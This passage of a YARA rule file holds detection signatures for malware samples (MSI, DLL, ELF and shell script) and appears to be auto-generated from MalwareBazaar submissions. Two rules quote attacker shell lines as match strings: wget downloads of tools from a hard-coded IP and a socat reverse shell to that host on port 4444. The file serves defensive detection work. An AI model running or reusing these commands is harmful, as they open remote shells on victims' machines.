      $s2 = "roductCode{E93670FC-70C1-4A3A-A6C3-64E711B8C9CF}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "4jEcspy(" fullword ascii
      $s4 = "gerfwaeft" fullword ascii
      $s5 = "tuS.Qoa" fullword ascii
      $s6 = "}LR1ZfTp" fullword ascii
      $s7 = "JZflE61" fullword ascii
      $s8 = "# qocU" fullword ascii
      $s9 = "-t- >AF" fullword ascii
      $s10 = "+ G:x#Wm" fullword ascii
      $s11 = "yyZKeo1" fullword ascii
      $s12 = "x*- nt" fullword ascii
      $s13 = "jNcTc63" fullword ascii
      $s14 = "JhZXu12" fullword ascii
      $s15 = "bA- j@x" fullword ascii
      $s16 = ",G4]Yb}T+ " fullword ascii
      $s17 = "Q>O* !n" fullword ascii
      $s18 = "Vl%y%Bf" fullword ascii
      $s19 = "vfbB-t+" fullword ascii
      $s20 = "GCLKE`F" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf {
   meta:
      description = "evidences - file 7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{E93670FC-70C1-4A3A-A6C3-64E711B8C9CF}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "4jEcspy(" fullword ascii
      $s4 = "gdwrgfgjh" fullword ascii
      $s5 = "tuS.Qoa" fullword ascii
      $s6 = "}LR1ZfTp" fullword ascii
      $s7 = "JZflE61" fullword ascii
      $s8 = "# qocU" fullword ascii
      $s9 = "-t- >AF" fullword ascii
      $s10 = "+ G:x#Wm" fullword ascii
      $s11 = "yyZKeo1" fullword ascii
      $s12 = "x*- nt" fullword ascii
      $s13 = "jNcTc63" fullword ascii
      $s14 = "JhZXu12" fullword ascii
      $s15 = "bA- j@x" fullword ascii
      $s16 = ",G4]Yb}T+ " fullword ascii
      $s17 = "Q>O* !n" fullword ascii
      $s18 = "Vl%y%Bf" fullword ascii
      $s19 = "vfbB-t+" fullword ascii
      $s20 = "GCLKE`F" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea {
   meta:
      description = "evidences - file b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{E93670FC-70C1-4A3A-A6C3-64E711B8C9CF}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "4jEcspy(" fullword ascii
      $s4 = "fdrthghkm" fullword ascii
      $s5 = "tuS.Qoa" fullword ascii
      $s6 = "}LR1ZfTp" fullword ascii
      $s7 = "JZflE61" fullword ascii
      $s8 = "# qocU" fullword ascii
      $s9 = "-t- >AF" fullword ascii
      $s10 = "+ G:x#Wm" fullword ascii
      $s11 = "yyZKeo1" fullword ascii
      $s12 = "x*- nt" fullword ascii
      $s13 = "jNcTc63" fullword ascii
      $s14 = "JhZXu12" fullword ascii
      $s15 = "bA- j@x" fullword ascii
      $s16 = ",G4]Yb}T+ " fullword ascii
      $s17 = "Q>O* !n" fullword ascii
      $s18 = "Vl%y%Bf" fullword ascii
      $s19 = "vfbB-t+" fullword ascii
      $s20 = "GCLKE`F" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714 {
   meta:
      description = "evidences - file 297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714.dll"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714"
   strings:
      $s1 = "c:\\users\\public\\Libraries\\" fullword wide
      $s2 = "wfdrproxy.dll" fullword wide
      $s3 = "RecDiag.dll" fullword wide
      $s4 = "DOLKR.dll" fullword wide
      $s5 = "C:\\DSJALDJSLKAJDKSAJFKLSAFJSAKJFKFJKSAC\\Debug\\RecDiag.pdb" fullword ascii
      $s6 = "PPDFLM.exe" fullword wide
      $s7 = "splsched.exe" fullword wide
      $s8 = "DOLKR.exe" fullword wide
      $s9 = "g2mupdate.exe" fullword wide
      $s10 = "USB_Driver.exe" fullword wide
      $s11 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s12 = "G2M.dll" fullword wide
      $s13 = "dllprocessattach" fullword ascii
      $s14 = "c:\\_\\$WinREAgent\\" fullword wide
      $s15 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\per_thread_data.cpp" fullword ascii
      $s16 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_type_info.cpp" fullword ascii
      $s17 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_exception.cpp" fullword wide
      $s18 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\winapi_downlevel.cpp" fullword wide
      $s19 = "UTF-8 isn't supported in this _mbtowc_l function yet!!!" fullword wide
      $s20 = "_loc_update.GetLocaleT()->locinfo->_public._locale_lc_codepage != CP_UTF8 && L\"UTF-8 isn't supported in this _mbtowc_l function" wide
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef7890d0da {
   meta:
      description = "evidences - file e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef7890d0da.dll"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef7890d0da"
   strings:
      $x1 = "c:\\users\\public\\Libraries\\PPDFLM.exe" fullword wide
      $s2 = "wfdrproxy.dll" fullword ascii
      $s3 = "z:\\_\\$WinREAgent\\DOLKR.exe" fullword wide
      $s4 = "C:\\DSAJKLDSJLAJKSAJFKSAJKFSAJKSAJFKSAJKFAFF\\Debug\\wfdrproxy.pdb" fullword ascii
      $s5 = "GetLatestLoginErrorCode" fullword ascii
      $s6 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s7 = "GetLoginLatestSucceedTime" fullword ascii
      $s8 = "GetAllBypass" fullword ascii
      $s9 = "GetLoginLatestTime" fullword ascii
      $s10 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\per_thread_data.cpp" fullword ascii
      $s11 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_type_info.cpp" fullword ascii
      $s12 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_exception.cpp" fullword wide
      $s13 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\winapi_downlevel.cpp" fullword wide
      $s14 = "UTF-8 isn't supported in this _mbtowc_l function yet!!!" fullword wide
      $s15 = "_loc_update.GetLocaleT()->locinfo->_public._locale_lc_codepage != CP_UTF8 && L\"UTF-8 isn't supported in this _mbtowc_l function" wide
      $s16 = "TryClientLogin" fullword ascii
      $s17 = "GetDownLoadSettingsLatestSucceedTime" fullword ascii
      $s18 = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.35.32215\\include\\xmemory" fullword wide
      $s19 = "PassComputerUniqueID" fullword ascii
      $s20 = "AppPolicyGetThreadInitializationType" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule a73c0a6b539599e535539839c885e7c978a270e22929a36fd4636038049627eb {
   meta:
      description = "evidences - file a73c0a6b539599e535539839c885e7c978a270e22929a36fd4636038049627eb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a73c0a6b539599e535539839c885e7c978a270e22929a36fd4636038049627eb"
   strings:
      $s1 = "!Require Windows" fullword ascii
      $s2 = "PWVhm&@" fullword ascii
      $s3 = "PVVVVVVVhh" fullword ascii
      $s4 = "lSVWj@" fullword ascii
      $s5 = "It\\It0IuKf" fullword ascii
      $s6 = "tTSWSj" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule sig_2e5e8cded860bb8af5f959e92579ff98abea942f0016b85b843838e3aba81eba {
   meta:
      description = "evidences - file 2e5e8cded860bb8af5f959e92579ff98abea942f0016b85b843838e3aba81eba.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "2e5e8cded860bb8af5f959e92579ff98abea942f0016b85b843838e3aba81eba"
   strings:
      $s1 = "\\}+HP9)" fullword ascii
      $s2 = "|}H.}}J" fullword ascii
      $s3 = ",|{H.|" fullword ascii
      $s4 = "})^0q " fullword ascii
      $s5 = "x|}H.8" fullword ascii
      $s6 = "} HPU)" fullword ascii
      $s7 = "|{H.= " fullword ascii
      $s8 = "UjX(}kRx" fullword ascii
      $s9 = "U)@.9@" fullword ascii
      $s10 = "8|iX.H" fullword ascii
      $s11 = " }$KxB" fullword ascii
      $s12 = "x|iX.K" fullword ascii
      $s13 = "}*Kx9`" fullword ascii
      $s14 = "}}H.}=J" fullword ascii
      $s15 = "+xTi@.})" fullword ascii
      $s16 = "}kJx}JZx" fullword ascii
      $s17 = "}kJxUj" fullword ascii
      $s18 = ":}VI.}6J" fullword ascii
      $s19 = "UIX(}JJx" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e {
   meta:
      description = "evidences - file 3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{AB18198C-EE97-4289-85C1-652DCE68E26E}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "dxdfsgfdh" fullword ascii
      $s4 = "E4jt:\\pxld" fullword ascii
      $s5 = "qCom c:" fullword ascii
      $s6 = "I\\wX\\fTp" fullword ascii
      $s7 = "# 2fA`" fullword ascii
      $s8 = "Z* k&g" fullword ascii
      $s9 = ">\"k /B " fullword ascii
      $s10 = "vuiydb" fullword ascii
      $s11 = "nZ}5'y>%Q%OD" fullword ascii
      $s12 = "f> -$|" fullword ascii
      $s13 = "yt (* " fullword ascii
      $s14 = "\\KOmAg~b.:y" fullword ascii
      $s15 = "fSyJL43" fullword ascii
      $s16 = "%5TU+ " fullword ascii
      $s17 = "819$+ v" fullword ascii
      $s18 = ")tV14{+ m" fullword ascii
      $s19 = "Dt* &I" fullword ascii
      $s20 = "R]uw* " fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_4014fd11adf44f0079bbb11f45545f444c5dc60574a1e31f7547d2e65959c41c {
   meta:
      description = "evidences - file 4014fd11adf44f0079bbb11f45545f444c5dc60574a1e31f7547d2e65959c41c.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "4014fd11adf44f0079bbb11f45545f444c5dc60574a1e31f7547d2e65959c41c"
   strings:
      $s1 = "wget http://185.157.247.12/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://185.157.247.12/.a/gdb -O- > gdb" fullword ascii
      $s3 = "wget http://185.157.247.12/.a/strace -O- > strace" fullword ascii
      $s4 = "wget http://185.157.247.12/.a/socat -O- > socat" fullword ascii
      $s5 = "./socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:185.157.247.12:4444" fullword ascii
      $s6 = "cd /tmp" fullword ascii
      $s7 = "chmod +x *" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule a8d4bb9ec84e3cfe30d77780b6e885940486e2c92bcf23bf7f67d93d610725e5 {
   meta:
      description = "evidences - file a8d4bb9ec84e3cfe30d77780b6e885940486e2c92bcf23bf7f67d93d610725e5.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a8d4bb9ec84e3cfe30d77780b6e885940486e2c92bcf23bf7f67d93d610725e5"
   strings:
      $s1 = "wget http://185.157.247.12/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://185.157.247.12/.a/gdb -O- > gdb" fullword ascii
      $s3 = "wget http://185.157.247.12/.a/strace -O- > strace" fullword ascii
      $s4 = "wget http://185.157.247.12/.a/socat -O- > socat" fullword ascii
      $s5 = "./socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:185.157.247.12:4444" fullword ascii
      $s6 = "cd /tmp" fullword ascii
      $s7 = "chmod 777 *" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b {
   meta:
      description = "evidences - file 4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "iRCGs\"" fullword ascii
      $s3 = "roductCode{F7463C1B-57EF-4D19-AD81-9ED639A060D5}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = ";;\"2\"/c=" fullword ascii /* hex encoded string ',' */
      $s5 = "<aRat;<1" fullword ascii
      $s6 = "0HRXC!." fullword ascii
      $s7 = "setrertgjh" fullword ascii
      $s8 = "hJ,R:\\#" fullword ascii
      $s9 = "ME:\"bb" fullword ascii
      $s10 = "?c:\\p-" fullword ascii
      $s11 = "y:\\[['~" fullword ascii
      $s12 = "/6bl:\"" fullword ascii
      $s13 = "f#h1xz:\"" fullword ascii
      $s14 = "+f?S:\\" fullword ascii
      $s15 = "cw/ %i:x" fullword ascii
      $s16 = "{;gw+%cMd" fullword ascii
      $s17 = "e*-irC" fullword ascii
      $s18 = "K;Spy9" fullword ascii
      $s19 = "kr'qgEt2" fullword ascii
      $s20 = "v_1rAT" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 23000KB and
      1 of ($x*) and 4 of them
}

rule sig_5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b75cf7f1 {
   meta:
      description = "evidences - file 5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b75cf7f1.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b75cf7f1"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "iRCGs\"" fullword ascii
      $s3 = ";;\"2\"/c=" fullword ascii /* hex encoded string ',' */
      $s4 = "<aRat;<1" fullword ascii
      $s5 = "roductCode{7B404D36-5E15-4EA4-80CE-E33161DF0929}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s6 = "0HRXC!." fullword ascii
      $s7 = "bewtfdhytj" fullword ascii
      $s8 = "hJ,R:\\#" fullword ascii
      $s9 = "ME:\"bb" fullword ascii
      $s10 = "?c:\\p-" fullword ascii
      $s11 = "y:\\[['~" fullword ascii
      $s12 = "/6bl:\"" fullword ascii
      $s13 = "f#h1xz:\"" fullword ascii
      $s14 = "+f?S:\\" fullword ascii
      $s15 = "cw/ %i:x" fullword ascii
      $s16 = "{;gw+%cMd" fullword ascii
      $s17 = "e*-irC" fullword ascii
      $s18 = "K;Spy9" fullword ascii
      $s19 = "kr'qgEt2" fullword ascii
      $s20 = "v_1rAT" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 24000KB and
      1 of ($x*) and 4 of them
}

rule bb48759e546b346ff0ea1cf7e9a464845060b568dd82272c62f7ef6a301393e9 {
   meta:
      description = "evidences - file bb48759e546b346ff0ea1cf7e9a464845060b568dd82272c62f7ef6a301393e9.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "bb48759e546b346ff0ea1cf7e9a464845060b568dd82272c62f7ef6a301393e9"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "iRCGs\"" fullword ascii
      $s3 = ";;\"2\"/c=" fullword ascii /* hex encoded string ',' */
      $s4 = "<aRat;<1" fullword ascii
      $s5 = "roductCode{78E31E7E-52B1-4DF7-946D-D1062ED63B1F}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s6 = "* sdm~J" fullword ascii
      $s7 = "0HRXC!." fullword ascii
      $s8 = "aefrerhyfg" fullword ascii
      $s9 = "hJ,R:\\#" fullword ascii
      $s10 = "ME:\"bb" fullword ascii
      $s11 = "?c:\\p-" fullword ascii
      $s12 = "y:\\[['~" fullword ascii
      $s13 = "/6bl:\"" fullword ascii
      $s14 = "f#h1xz:\"" fullword ascii
      $s15 = "+f?S:\\" fullword ascii
      $s16 = "cw/ %i:x" fullword ascii
      $s17 = "{;gw+%cMd" fullword ascii
      $s18 = "e*-irC" fullword ascii
      $s19 = "K;Spy9" fullword ascii
      $s20 = "kr'qgEt2" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 24000KB and
      1 of ($x*) and 4 of them
}

rule c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c {
   meta:
      description = "evidences - file c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "iRCGs\"" fullword ascii
      $s3 = "roductCode{F7463C1B-57EF-4D19-AD81-9ED639A060D5}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = ";;\"2\"/c=" fullword ascii /* hex encoded string ',' */
      $s5 = "<aRat;<1" fullword ascii
      $s6 = "0HRXC!." fullword ascii
      $s7 = "gsertrtt" fullword ascii
      $s8 = "hJ,R:\\#" fullword ascii
      $s9 = "ME:\"bb" fullword ascii
      $s10 = "?c:\\p-" fullword ascii
      $s11 = "y:\\[['~" fullword ascii
      $s12 = "/6bl:\"" fullword ascii
      $s13 = "f#h1xz:\"" fullword ascii
      $s14 = "+f?S:\\" fullword ascii
      $s15 = "cw/ %i:x" fullword ascii
      $s16 = "{;gw+%cMd" fullword ascii
      $s17 = "e*-irC" fullword ascii
      $s18 = "K;Spy9" fullword ascii
      $s19 = "kr'qgEt2" fullword ascii
      $s20 = "v_1rAT" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 23000KB and
      1 of ($x*) and 4 of them
}

rule sig_513f1dfeb150a3e0134ab2aac640e6fecdd1adb2c95002f49299f11e526eee4e {
   meta:
      description = "evidences - file 513f1dfeb150a3e0134ab2aac640e6fecdd1adb2c95002f49299f11e526eee4e.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "513f1dfeb150a3e0134ab2aac640e6fecdd1adb2c95002f49299f11e526eee4e"
   strings:
      $s1 = "panF3Qkgw" fullword ascii /* base64 encoded string 'jqwBH0' */
      $s2 = "JjhCMVVQA" fullword ascii /* base64 encoded string '&8B1UP' */
      $s3 = "SV56Lmc8w" fullword ascii /* base64 encoded string 'I^z.g<' */
      $s4 = "ecuu.reu&`" fullword ascii
      $s5 = "EKDy:\"" fullword ascii
      $s6 = "* 1wX!" fullword ascii
      $s7 = "* Sp4B" fullword ascii
      $s8 = "* <JD1y/D" fullword ascii
      $s9 = "CoCsF=IDLlLmLoLtLuMcMeMnNdNlNoOK" fullword ascii
      $s10 = "pZY- -0" fullword ascii
      $s11 = "9execB" fullword ascii
      $s12 = "OEOFEndErrFPEFebFriGETGetH" fullword ascii
      $s13 = "Jd@finfmaftpgso" fullword ascii
      $s14 = "%,6@/_8$`" fullword ascii /* hex encoded string 'h' */
      $s15 = "7:$668,,/" fullword ascii /* hex encoded string 'vh' */
      $s16 = "7[A^%S%" fullword ascii
      $s17 = "3 chan<- KrDcZ04r" fullword ascii
      $s18 = "/jYhQM -" fullword ascii
      $s19 = "ccepttion" fullword ascii
      $s20 = "wllozvt" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 11000KB and
      8 of them
}

rule sig_636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5 {
   meta:
      description = "evidences - file 636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{F24F4CB8-1C5F-4258-A565-F326F70BA51B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "6\\)~c/\"" fullword ascii /* hex encoded string 'l' */
      $s4 = "* v=4o" fullword ascii
      $s5 = "* 0GZP+" fullword ascii
      $s6 = "dweryftu" fullword ascii
      $s7 = "1#D:\"m" fullword ascii
      $s8 = "N:\\b\"s" fullword ascii
      $s9 = "gEt%~^L" fullword ascii
      $s10 = " -c]~}" fullword ascii
      $s11 = ">$(^- " fullword ascii
      $s12 = "vs /Iy" fullword ascii
      $s13 = "(_.Juc" fullword ascii
      $s14 = "zoWhVtg" fullword ascii
      $s15 = "sXwLu~l" fullword ascii
      $s16 = "mzxW}@g" fullword ascii
      $s17 = "tHthl)T" fullword ascii
      $s18 = "KfEW<.h" fullword ascii
      $s19 = "KByF][w" fullword ascii
      $s20 = "{0EDEF991-300A-44FE-919E-AAF24CBFC3B4}" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9 {
   meta:
      description = "evidences - file a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{F24F4CB8-1C5F-4258-A565-F326F70BA51B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "6\\)~c/\"" fullword ascii /* hex encoded string 'l' */
      $s4 = "* v=4o" fullword ascii
      $s5 = "* 0GZP+" fullword ascii
      $s6 = "dsfertgfjh" fullword ascii
      $s7 = "1#D:\"m" fullword ascii
      $s8 = "N:\\b\"s" fullword ascii
      $s9 = "gEt%~^L" fullword ascii
      $s10 = " -c]~}" fullword ascii
      $s11 = ">$(^- " fullword ascii
      $s12 = "vs /Iy" fullword ascii
      $s13 = "(_.Juc" fullword ascii
      $s14 = "zoWhVtg" fullword ascii
      $s15 = "sXwLu~l" fullword ascii
      $s16 = "mzxW}@g" fullword ascii
      $s17 = "tHthl)T" fullword ascii
      $s18 = "KfEW<.h" fullword ascii
      $s19 = "KByF][w" fullword ascii
      $s20 = "{0EDEF991-300A-44FE-919E-AAF24CBFC3B4}" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f {
   meta:
      description = "evidences - file e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{F24F4CB8-1C5F-4258-A565-F326F70BA51B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "6\\)~c/\"" fullword ascii /* hex encoded string 'l' */
      $s4 = "* v=4o" fullword ascii
      $s5 = "* 0GZP+" fullword ascii
      $s6 = "gdtserhygj" fullword ascii
      $s7 = "1#D:\"m" fullword ascii
      $s8 = "N:\\b\"s" fullword ascii
      $s9 = "gEt%~^L" fullword ascii
      $s10 = " -c]~}" fullword ascii
      $s11 = ">$(^- " fullword ascii
      $s12 = "vs /Iy" fullword ascii
      $s13 = "(_.Juc" fullword ascii
      $s14 = "zoWhVtg" fullword ascii
      $s15 = "sXwLu~l" fullword ascii
      $s16 = "mzxW}@g" fullword ascii
      $s17 = "tHthl)T" fullword ascii
      $s18 = "KfEW<.h" fullword ascii
      $s19 = "KByF][w" fullword ascii
      $s20 = "{0EDEF991-300A-44FE-919E-AAF24CBFC3B4}" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb {
   meta:
      description = "evidences - file fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{F24F4CB8-1C5F-4258-A565-F326F70BA51B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "6\\)~c/\"" fullword ascii /* hex encoded string 'l' */
      $s4 = "* v=4o" fullword ascii
      $s5 = "* 0GZP+" fullword ascii
      $s6 = "brhytgyjh" fullword ascii
      $s7 = "1#D:\"m" fullword ascii
      $s8 = "N:\\b\"s" fullword ascii
      $s9 = "gEt%~^L" fullword ascii
      $s10 = " -c]~}" fullword ascii
      $s11 = ">$(^- " fullword ascii
      $s12 = "vs /Iy" fullword ascii
      $s13 = "(_.Juc" fullword ascii
      $s14 = "zoWhVtg" fullword ascii
      $s15 = "sXwLu~l" fullword ascii
      $s16 = "mzxW}@g" fullword ascii
      $s17 = "tHthl)T" fullword ascii
      $s18 = "KfEW<.h" fullword ascii
      $s19 = "KByF][w" fullword ascii
      $s20 = "{0EDEF991-300A-44FE-919E-AAF24CBFC3B4}" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c {
   meta:
      description = "evidences - file 9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
